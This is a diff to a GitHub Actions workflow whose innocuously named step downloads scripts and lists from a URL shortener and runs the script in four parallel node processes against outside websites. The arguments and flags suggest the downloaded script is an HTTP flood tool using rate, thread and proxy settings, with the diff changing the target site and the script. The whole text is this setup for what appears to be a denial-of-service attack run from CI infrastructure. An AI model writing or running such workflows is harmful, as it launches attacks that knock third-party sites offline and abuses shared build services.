@@ -15,13 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/JqoH1/prov2.js
+          wget https://curl.by/VgaZT/value.js
           wget https://curl.by/19kka/fres.txt
+          wget https://curl.by/BS8DR/ua.txt
           chmod +x prov2.js
           npm i axios hpack
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node prov2.js GET https://graph.vshield.pro/ 120 16 90 fres.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
+            timeout 105 node value.js https://cfcybernews.eu 100 64 10 fres.txt
             PIDS+=($!)
           done
           
